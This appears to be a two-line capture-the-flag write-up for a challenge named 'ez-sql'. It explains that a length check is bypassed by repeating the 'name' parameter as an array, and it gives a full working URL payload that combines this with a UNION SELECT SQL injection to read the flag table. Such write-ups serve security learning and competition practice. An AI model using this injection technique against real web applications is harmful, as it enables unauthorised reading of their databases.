# ez-sql
Bypass the length condition by using array.
Payload: `https://ez-sql-9bdcda9c92d0db43.tjc.tf/search?name=aaa&name=bbb\' union select 1,(select flag from flag_9693387e_6be4_4238_be3c_e02e081b9af8)--`